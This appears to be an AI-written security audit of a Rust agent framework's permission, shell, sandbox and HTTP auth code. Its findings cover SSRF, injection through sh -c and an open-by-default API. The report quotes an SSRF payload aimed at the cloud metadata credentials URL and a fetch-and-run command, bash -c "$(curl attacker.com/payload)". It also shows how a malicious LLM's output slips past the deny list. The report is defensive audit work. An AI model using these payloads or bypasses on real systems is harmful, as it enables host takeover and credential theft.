# Review: 安全与权限系统

**Date**: 2026-06-06
**Reviewer**: Security Auditor (AI)
**Scope**: `permissions/mod.rs`, `permissions/auto_classifier.rs`, `tools/policy_sandbox.rs`, `tools/shell.rs`, `tools/fs.rs`, `tools/docker_sandbox.rs`, `tools/docker_provider.rs`, `tools/e2b_provider.rs`, `http/auth.rs`, `http/rate_limit.rs`, `http/handlers.rs`, `hooks/mod.rs`, `hooks/external.rs`, `hooks/config.rs`, `tools/web_fetch.rs`

---

## Executive Summary

代码整体工程质量较高：`resolve_within` 的路径遍历防护经过了深思熟虑，权限系统分层清晰，JWT 实现强制了 `exp` 字段，常量时间比较防止了时序侧信道。然而审计发现了 **3 个严重问题**、**5 个中等问题**、**4 个轻微问题**，部分问题在组合利用场景下可导致完整的沙箱逃逸或未授权的远程代码执行。

---

## 严重问题 (Critical) — 必须修复

### SEC-001 — SSRF (CWE-918)

**Location**: `src/tools/web_fetch.rs:36-44` (`validate_url`)

**Exploit scenario**: 攻击者令 Agent 调用 `WebFetch` 并传入 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 或 `http://10.0.0.1/admin`；`validate_url` 仅检查协议头是否为 `http://` / `https://`，不检查目标 IP，Agent 随即向云元数据服务或内网节点发起请求，攻击者从响应内容读取到 AWS/GCP/Azure 实例凭证或内网敏感 API。

```rust
// 当前代码：只检查协议前缀
fn validate_url(url: &str) -> Result<String> {
    if !url.starts_with("http://") && !url.starts_with("https://") {
        return Err(...);
    }
    Ok(url.to_string())  // 未检查目标 IP
}
```

**Fix**: 在发起请求前解析主机名并拒绝解析结果为 RFC 1918 / link-local / loopback / metadata range 的地址（`169.254.0.0/16`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.0/8`、`::1`）。同时禁止 `localhost` 字面量。

---

### SEC-002 — OS Command Injection via `sh -c` (CWE-78)

**Location**: `src/tools/shell.rs:89-91`

**Exploit scenario**: `RunShell` 工具将用户/LLM 提供的任意字符串通过 `/bin/sh -c <command>` 执行。`policy_sandbox.rs` 中 `default_restrictive` 的 deny 列表只有 4 条极其简单的字符串（`rm -rf /`、`rm -rf ~`、`mkfs`、`> /dev/`），而且必须完全匹配子字符串。攻击者/恶意 LLM 输出 `rm\t-rf /` 或 `r\u{200B}m -rf /`，或使用 `bash -c "$(curl attacker.com/payload)"` 即可绕过，同时获得完整主机 shell 执行权。组合 SEC-001 可进行无交互 RCE。

```rust
// src/tools/shell.rs:89
let mut cmd = Command::new("/bin/sh");
cmd.arg("-c").arg(command); // command 是用户完整控制的字符串
```

**Fix**: (1) deny 列表仅作辅助，不可作为唯一防线；核心防线应该是沙箱（Docker/E2B）。(2) 若需在主机上运行，应采用参数化 exec 而非 `sh -c <string>`。(3) 若 `sh -c` 不可避免，至少运行在 seccomp/AppArmor 约束的 rootless 容器内。

---

### SEC-003 — Missing Authentication for Critical Function (CWE-306)

**Location**: `src/http/auth.rs:62-65` + `src/http/mod.rs:419`

**Exploit scenario**: `AuthConfig` 默认构造时 `keys` 为空向量；`is_valid()` 在 `keys.is_empty()` 时直接返回 `true`，即无凭证放行。`auth_config_from_env()` 在 `RECURSIVE_HTTP_AUTH_KEYS` 环境变量未设置时同样构造空 keys。结果：HTTP 服务端口在任何未显式配置认证的部署中对所有人完全开放。

```rust
// src/http/auth.rs:63-65
pub fn is_valid(&self, presented: &str) -> bool {
    if self.keys.is_empty() {
        return true;  // 空 keys = 无限制访问
    }
    ...
}
```

**Fix**: 翻转默认值：无配置时应拒绝所有请求并在启动日志中打印警告，而不是允许。

---

## 中等问题 (Major) — 应该修复

### SEC-004 — Docker Volume 可写挂载 (CWE-284)

**Location**: `src/tools/docker_sandbox.rs:58`

Docker sandbox 以读写方式将宿主机 workspace 挂载到容器 `/workspace`（无 `:ro` 标志）。容器内的代码可以覆盖宿主机工作区的任意文件，包括 `.git/hooks/pre-commit`（提交钩子注入）或 `Cargo.toml` / `build.rs`（构建时代码注入）。

```rust
binds: Some(vec![format!("{workspace_str}:/workspace")]),
// 应为: format!("{workspace_str}:/workspace:ro") 或有选择性地 rw
```

---

### SEC-005 — E2B api_base SSRF (CWE-601)

**Location**: `src/tools/e2b_provider.rs:59`

`RECURSIVE_E2B_API_BASE` 环境变量直接被用于构造所有 E2B API 请求 URL，无任何校验。攻击者若能控制此变量，可将其指向内网服务，利用 E2B 客户端的 `X-API-Key` 头向内网发起认证请求。

---

### SEC-006 — Rate Limiter 对暴力破解无效 (CWE-307)

**Location**: `src/http/rate_limit.rs:101-112`

速率限制以 `X-API-Key` header 值作为 bucket key。攻击者暴力破解 API key 时，每次猜测都使用不同的 key 值，每个都获得一个全满的新 bucket。实际上攻击者可以无限速地枚举 API key。另外，中间件顺序是 auth → rate_limit，认证在速率限制之前，使得暴力破解不触发 429。

**Fix**: (1) 对未通过认证的请求按来源 IP 做速率限制；(2) 将速率限制中间件置于认证层之前；(3) 对认证失败的 IP 单独维护退避计数器。

---

### SEC-007 — Hook `updated_input` 绕过策略检查 (CWE-116)

**Location**: `src/hooks/external.rs:125-126` + `src/tools/mod.rs:837-839`

外部 hook 可以返回 `updated_input` 完整替换传给工具的 arguments。一个被入侵的 hook 脚本可以将 `Bash` 工具的 `command` 完整替换为任意命令，绕过所有上游的策略 deny 检查，因为 `updated_input` 替换发生在策略检查之后。

**Fix**: `updated_input` 替换后必须重新过一遍权限检查和 policy sandbox 检查。

---

### SEC-008 — Policy Sandbox 未接入工具调用链 (CWE-668)

**Location**: `src/tools/policy_sandbox.rs:64-75` + `src/tools/mod.rs:309-472`

`PolicyConfig` 存在于 `ToolRegistry`，但 `invoke_with_audit` 从不调用 `policy.check_shell()` 或 `policy.check_fs_path()`。注释说"tools must call `registry.policy()` and check before executing"，即依赖工具作者自己调用——而 `RunShell`、`ReadFile`、`WriteFile` 均未调用。`default_restrictive` 的 4 条 deny 规则对实际的工具调用路径完全无效。

**Fix**: 在 `invoke_with_audit` 中，在调用 `tool.execute()` 之前，若 policy 存在，自动调用策略检查并在失败时返回 `PermissionDenied`。这是架构级别的缺口，应在框架层强制而非依赖工具实现者。

---

## 轻微问题 (Minor) — 建议改进

### SEC-009 — Session ID 可预测性 (CWE-330)

**Location**: `src/http/handlers.rs:164-165`

`generate_session_id()` 使用 UUID v7（时间有序），相邻 session ID 之间具有时间相关性。建议使用 UUID v4 替代。

### SEC-010 — E2B 沙箱泄漏风险

**Location**: `src/tools/e2b_provider.rs:232-241`

E2B API key 在 `Drop` 实现中被克隆到异步任务内，若 tokio runtime 在关闭过程中，`tokio::spawn` 可能静默失败，导致沙箱泄漏。

### SEC-011 — Rate Limiter 内存无界增长 (CWE-400)

**Location**: `src/http/rate_limit.rs:55-62`

`RateLimiter` 的 bucket HashMap 按 client key 无限增长。攻击者发送大量带不同随机 `X-API-Key` 值的请求可撑爆进程内存。建议设置最大条目数并使用 LRU 淘汰。

### SEC-012 — `resolve_within` Symlink Race Condition (CWE-22)

**Location**: `src/tools/mod.rs:1028-1050`

`resolve_within` 对已存在的路径进行 `canonicalize()` 验证，但检查和实际文件操作之间存在 TOCTOU 窗口，可通过 symlink 竞争绕过。建议使用 `cap-std` crate 的 capability-based filesystem API。

---

## 正面评价

1. **`resolve_within` 的双重检查**（`src/tools/mod.rs:1006-1052`）：词法 normalize + canonicalize 两阶段检查，正确处理了绝对路径注入、`../` 遍历和现有 symlink 逃逸。

2. **PROTECTED_PATHS 的组件级匹配**（`src/permissions/mod.rs:639-643`）：使用 `Path::components()` 而非字符串 `contains()`，正确避免假阳性，即使在 `BypassPermissions` 模式下也强制执行。

3. **常量时间 API key 比较**（`src/http/auth.rs:62-81`）：使用 XOR 累计差异位而非 `==` 短路比较，正确防止了时序侧信道攻击。

4. **JWT 强制 `exp` 字段**（`src/http/auth.rs:126`）：`validation.set_required_spec_claims(&["exp"])` 拒绝无有效期 token。

5. **自动分类器失败关闭**（`src/permissions/auto_classifier.rs:147-150`）：JSON 解析失败时默认 `block=true`，符合安全设计原则。

6. **Hook 执行独立进程**（`src/hooks/external.rs:634-668`）：通过 `Command::new(path)` 启动独立进程，输入通过 stdin JSON 传递，不拼接 shell 命令。

---

## 建议优先级

| 优先级 | Issue | 预计影响 |
|--------|-------|---------|
| P0 — 立即修复 | SEC-001 (SSRF) | 云环境凭证泄露 |
| P0 — 立即修复 | SEC-003 (默认无认证) | 未授权 RCE |
| P1 — 本迭代修复 | SEC-002 (sh -c 注入 + 无效 deny 列表) | 主机 RCE |
| P1 — 本迭代修复 | SEC-008 (policy sandbox 未接入调用链) | 策略形同虚设 |
| P2 — 下迭代修复 | SEC-004 (Docker 读写挂载) | 容器逃逸写宿主机 |
| P2 — 下迭代修复 | SEC-006 (限流对暴力破解无效) | API key 枚举 |
| P2 — 下迭代修复 | SEC-007 (hook updated_input 绕过策略检查) | 策略绕过 |
| P3 — 下迭代修复 | SEC-005 (E2B api_base 未校验) | SSRF/中间人 |
| P4 — 技术债 | SEC-009, SEC-010, SEC-011, SEC-012 | 低风险 |
